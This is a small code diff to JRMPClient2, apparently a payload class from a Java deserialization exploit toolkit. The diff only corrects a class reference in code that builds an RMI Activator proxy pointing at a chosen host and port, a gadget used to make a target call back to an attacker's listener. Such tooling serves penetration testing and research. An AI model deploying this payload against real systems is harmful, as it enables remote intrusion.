@@ -71,7 +71,7 @@ public class JRMPClient2 extends PayloadRunner implements ObjectPayload<Activato
         TCPEndpoint te = new TCPEndpoint(host, port);
         UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
         RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
-        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
+        Activator proxy = (Activator) Proxy.newProxyInstance(JRMPClient2.class.getClassLoader(), new Class[] {
             Activator.class
         }, obj);
         return proxy;
